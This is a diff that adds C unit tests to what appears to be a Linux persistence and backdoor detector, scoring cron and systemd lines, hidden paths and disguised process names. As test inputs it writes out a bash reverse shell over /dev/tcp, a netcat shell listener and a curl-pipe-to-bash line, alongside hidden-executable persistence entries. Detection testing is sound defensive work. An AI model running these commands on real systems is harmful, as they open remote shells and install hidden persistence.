@@ -129,3 +129,47 @@ CTFIR_TEST(ldso_directory_prefix_boundaries) {
     CHECK(!xinetd_line_is_backdoor("   # server = /tmp/x"));
     CHECK(!pam_line_is_backdoor("   "));
 }
+
+
+CTFIR_TEST(ldso_multilib_and_prefix_negatives) {
+    CHECK(!ldso_path_is_unusual("/lib32"));
+    CHECK(!ldso_path_is_unusual("/usr/lib32"));
+    CHECK(!ldso_path_is_unusual("/libx32/normal"));
+    CHECK(ldso_path_is_unusual("/lib32evil"));
+    CHECK(ldso_path_is_unusual("/usr/libx32evil"));
+}
+CTFIR_TEST(hidden_exec_cron_and_systemd_variants) {
+    CHECK(linux_command_risk("* * * * * root /usr/local/bin/.sysupdate") == 2);
+    CHECK(linux_command_risk("@reboot /bin/bash /opt/.cache/worker.sh") == 2);
+    CHECK(linux_command_risk("ExecStart=-/usr/local/bin/.sysupdate") == 2);
+    CHECK(linux_command_risk("ExecStart=/bin/sh -c '/usr/local/bin/.sysupdate'") >= 2);
+    CHECK(linux_command_risk("/bin/bash /usr/local/bin/.sysupdate") == 2);
+    CHECK(linux_command_risk("ExecStart=\"/opt/.hidden/space worker\"") == 2);
+}
+CTFIR_TEST(persistence_normal_commands_are_not_high_risk) {
+    CHECK(linux_command_risk("ExecStart=/usr/bin/curl https://example.org/health") == 0);
+    CHECK(linux_command_risk("/usr/bin/python3 /usr/local/bin/backup.py") == 0);
+    CHECK(linux_command_risk("echo base64 python curl log") == 0);
+    CHECK(linux_command_risk("cat /root/.bashrc") == 0);
+    CHECK(linux_command_risk("echo ok > /var/log/.status") == 0);
+    CHECK(linux_command_risk("# /tmp/backdoor") == 0);
+    CHECK(linux_command_risk("/usr/bin/nc -l -p 5555") == 0); // port alone is not malicious
+    CHECK(!linux_hidden_path("/usr/local/../bin/task"));
+}
+CTFIR_TEST(shell_payload_and_writable_path_variants) {
+    CHECK(linux_command_risk("bash -i >& /dev/tcp/127.0.0.1/4444 0>&1") == 3);
+    CHECK(linux_command_risk("/bin/nc -lvnp 5555 -e /bin/sh") == 3);
+    CHECK(linux_command_risk("curl http://127.0.0.1/x | bash") == 3);
+    CHECK(linux_command_risk("/var/tmp/ctfir-marker") == 2);
+    CHECK(linux_command_risk("/dev/shm/ctfir-marker") == 2);
+    CHECK(linux_command_risk("/opt/ctfir-marker/worker") == 0);
+}
+CTFIR_TEST(proc_titles_and_kernel_camouflage) {
+    CHECK(proc_claimed_matches_exe("Thunar", "thunar"));
+    CHECK(proc_claimed_matches_exe("init", "systemd"));
+    CHECK(proc_claimed_matches_exe("(sd-pam)", "systemd"));
+    CHECK(proc_claimed_matches_exe("systemd-udevd", "udevadm"));
+    CHECK(proc_claimed_matches_exe("sshd -D [listener] 0 of 10-100 startups", "sshd"));
+    CHECK(!proc_claimed_matches_exe("[kworker/2:1]", "sleep"));
+    CHECK(!proc_claimed_matches_exe("[kworker/2:1]", "python3")); // runtime must not apply interpreter exemption
+}
